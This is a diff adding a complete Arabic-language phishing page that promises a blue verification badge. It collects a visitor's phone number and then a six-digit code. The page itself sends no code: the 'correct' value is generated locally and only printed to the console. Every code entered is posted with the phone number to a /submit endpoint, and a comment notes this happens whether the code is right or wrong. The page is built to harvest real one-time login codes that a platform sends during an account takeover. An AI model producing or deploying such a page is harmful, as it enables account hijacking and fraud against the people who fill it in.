@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>توثيق الحساب</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        body {
+            background: #0b2b40;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .box {
+            background: white;
+            max-width: 400px;
+            width: 100%;
+            padding: 40px 30px;
+            border-radius: 30px;
+            text-align: center;
+        }
+        h1 { color: #0d47a1; margin-bottom: 10px; }
+        p { color: #666; font-size: 14px; margin-bottom: 20px; }
+        input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #ddd;
+            border-radius: 12px;
+            font-size: 18px;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+        input:focus { border-color: #0d47a1; outline: none; }
+        button {
+            width: 100%;
+            padding: 15px;
+            background: #0d47a1;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        button:hover { background: #1565c0; }
+        .otp-box {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin: 15px 0;
+        }
+        .otp-box input {
+            width: 50px;
+            height: 60px;
+            text-align: center;
+            font-size: 24px;
+            margin: 0;
+        }
+        .hidden { display: none; }
+        .error { color: red; font-size: 14px; margin-top: 10px; }
+        .success { color: green; font-size: 14px; margin-top: 10px; }
+    </style>
+</head>
+<body>
+
+    <div class="box" id="app">
+        <!-- صفحة 1: رقم الهاتف -->
+        <div id="page1">
+            <h1>📱 توثيق الحساب</h1>
+            <p>أدخل رقم هاتفك للحصول على علامة التوثيق الزرقاء</p>
+            <input type="tel" id="phoneInput" placeholder="مثال: 01012345678">
+            <button onclick="sendPhone()">إرسال الرمز 📤</button>
+            <div id="phoneError" class="error"></div>
+        </div>
+
+        <!-- صفحة 2: OTP -->
+        <div id="page2" class="hidden">
+            <h1>🔑 رمز التحقق</h1>
+            <p>تم إرسال الرمز إلى <span id="displayPhone" style="font-weight:bold;color:#0d47a1;"></span></p>
+            <div class="otp-box">
+                <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
+                <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
+                <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
+                <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
+                <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
+                <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
+            </div>
+            <button onclick="verifyOtp()">تحقق ✅</button>
+            <div id="otpError" class="error"></div>
+            <div id="otpSuccess" class="success"></div>
+            <br>
+            <button onclick="resendOtp()" style="background:#666;">إعادة الإرسال 🔄</button>
+        </div>
+    </div>
+
+    <script>
+        let phoneNumber = '';
+        let correctOtp = '123456';
+
+        function sendPhone() {
+            const phone = document.getElementById('phoneInput').value.trim();
+            if (!/^[0-9]{10,15}$/.test(phone)) {
+                document.getElementById('phoneError').textContent = '⚠️ رقم غير صحيح';
+                return;
+            }
+            document.getElementById('phoneError').textContent = '';
+            phoneNumber = phone;
+            document.getElementById('displayPhone').textContent = phone;
+            
+            // توليد OTP عشوائي
+            correctOtp = Math.floor(100000 + Math.random() * 900000).toString();
+            console.log('📲 OTP:', correctOtp);
+            
+            document.getElementById('page1').classList.add('hidden');
+            document.getElementById('page2').classList.remove('hidden');
+            document.querySelectorAll('.otp-input')[0].focus();
+        }
+
+        function verifyOtp() {
+            let otp = '';
+            document.querySelectorAll('.otp-input').forEach(inp => otp += inp.value);
+            
+            if (otp.length !== 6) {
+                document.getElementById('otpError').textContent = '⚠️ أدخل الرمز كاملاً';
+                return;
+            }
+            
+            // إرسال للسيرفر (سواء صح أو غلط)
+            fetch('/submit', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: phoneNumber, otp: otp })
+            });
+            
+            if (otp === correctOtp) {
+                document.getElementById('otpError').textContent = '';
+                document.getElementById('otpSuccess').textContent = '✅ تم التوثيق بنجاح! 🎉';
+            } else {
+                document.getElementById('otpError').textContent = '❌ الرمز غير صحيح';
+                document.getElementById('otpSuccess').textContent = '';
+                document.querySelectorAll('.otp-input').forEach(inp => inp.value = '');
+                document.querySelectorAll('.otp-input')[0].focus();
+            }
+        }
+
+        function resendOtp() {
+            correctOtp = Math.floor(100000 + Math.random() * 900000).toString();
+            console.log('📲 OTP جديد:', correctOtp);
+            document.querySelectorAll('.otp-input').forEach(inp => inp.value = '');
+            document.getElementById('otpError').textContent = '';
+            document.getElementById('otpSuccess').textContent = '';
+            alert('✅ تم إعادة إرسال الرمز');
+        }
+
+        // التنقل بين خانات OTP
+        document.querySelectorAll('.otp-input').forEach((inp, i, arr) => {
+            inp.addEventListener('input', function() {
+                this.value = this.value.replace(/\D/g, '');
+                if (this.value.length === 1 && i < 5) arr[i+1].focus();
+            });
+            inp.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && this.value === '' && i > 0) arr[i-1].focus();
+            });
+        });
+    </script>
+
+</body>
+</html>
